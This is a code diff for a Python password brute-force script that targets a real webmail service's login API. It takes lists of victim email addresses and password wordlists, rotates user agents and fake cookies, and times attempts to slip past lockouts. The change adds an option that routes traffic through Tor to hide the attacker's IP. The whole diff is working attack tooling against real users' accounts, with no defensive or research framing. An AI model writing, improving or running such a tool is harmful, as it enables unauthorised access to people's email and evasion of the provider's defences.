@@ -4,6 +4,8 @@ import time
 import random
 import string
 from colorama import Fore, init
+import socks
+import socket
 
 init(autoreset=True)
 
@@ -13,12 +15,34 @@ USER_AGENTS = [
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
 ]
 
+
 def current_timestamp():
     return f"{Fore.WHITE}[{Fore.YELLOW}{time.strftime('%H:%M:%S', time.localtime())}{Fore.WHITE}]{Fore.RESET}"
+
+
+def set_up_tor():
+    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} INITIALIZING TOR PROXY...")
+    old_ip = get_public_ip()
+    socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
+    socket.socket = socks.socksocket
+    new_ip = get_public_ip()
+    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Old IP: {Fore.LIGHTBLUE_EX}{old_ip}")  
+    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} New IP (via Tor): {Fore.LIGHTBLUE_EX}{new_ip}")
+    time.sleep(1.5)
+
+def get_public_ip():
+    """Get the public IP address."""
+    try:
+        response = requests.get('https://api.ipify.org')
+        return response.text
+    except requests.RequestException:
+        return "Unknown IP"
+
 
 def load_usernames_from_file(filename):
     with open(filename, encoding='latin-1') as file:
         return file.read().splitlines()
+
 
 def parse_arguments():
     parser = argparse.ArgumentParser(
@@ -29,21 +53,24 @@ def parse_arguments():
     parser.add_argument('-w', '--wordlist', required=True, help="Password Wordlist")
     parser.add_argument('-u', '--user', type=str, help="Full username including @sasktel.net")
     parser.add_argument('-U', '--userfile', type=str, help="File containing a list of email addresses of targets")
-
+    parser.add_argument('--tor', action='store_true', help="Use Tor for anonymization")
     args = parser.parse_args()
     if args.user and args.userfile:
-        parser.error("Specify either a single user with -u/--user or a file containing a list of users with -U/--userfile, not both.")
+        parser.error(
+            "Specify either a single user with -u/--user or a file containing a list of users with -U/--userfile, not both.")
 
     users = [args.user] if args.user else load_usernames_from_file(args.userfile)
     with open(args.wordlist, encoding='latin-1') as file:
         passwords = file.read().splitlines()
 
-    return users, passwords
+    return users, passwords, args.tor
+
 
 def generate_random_cookie_part(length=48):
     characters = string.ascii_letters + string.digits + string.punctuation
     cookie_part = ''.join(random.choice(characters) for i in range(length))
     return cookie_part
+
 
 def attack(user, password, user_agent):
     url = 'https://webmail.sasktel.net/api/bf/login/'
@@ -86,7 +113,7 @@ def attack(user, password, user_agent):
             print(f"{Fore.YELLOW}RESPONSE:{Fore.RESET}{Fore.RED} {response.text}")
         elif response.status_code == 200:
             print(f"{Fore.YELLOW}RESPONSE:{Fore.RESET}{Fore.GREEN} {response.text}")
-        
+
             print(f"{current_timestamp()} PASSWORD FOUND: {Fore.LIGHTBLUE_EX}{password}")
             return True
     except requests.RequestException as e:
@@ -103,12 +130,17 @@ def get_last_password_index():
     except:
         return 0
 
+
 def set_last_password_index(index):
     with open("last_password_index.txt", "w") as f:
         f.write(str(index))
 
+
 if __name__ == '__main__':
-    users, passwords = parse_arguments()
+    users, passwords, use_tor = parse_arguments()
+
+    if use_tor:
+        set_up_tor()
 
     print("Starting the attack...")
 
@@ -122,7 +154,7 @@ if __name__ == '__main__':
     while current_password_index < len(passwords):
         for user in users:
 
-            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.LIGHTBLUE_EX}Attacking user: {user}")
+            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}Attacking user:{Fore.LIGHTBLUE_EX} {user}")
             attempted_passwords = 0
 
             for i in range(current_password_index, current_password_index + password_limit):
@@ -144,12 +176,10 @@ if __name__ == '__main__':
 
                 if attempt_count % 49 == 0:
 
-
                     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}Waiting for 15 minutes...")
-                    time.sleep(15*60)
+                    time.sleep(15 * 60)
 
                 elif attempt_count % 10 == 0 and use_pause:  # Modify this line
-
 
                     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}Waiting for 30 seconds...")
                     time.sleep(30)
@@ -157,6 +187,3 @@ if __name__ == '__main__':
         current_password_index += password_limit
 
     print("Attack finished.")
-
-
-
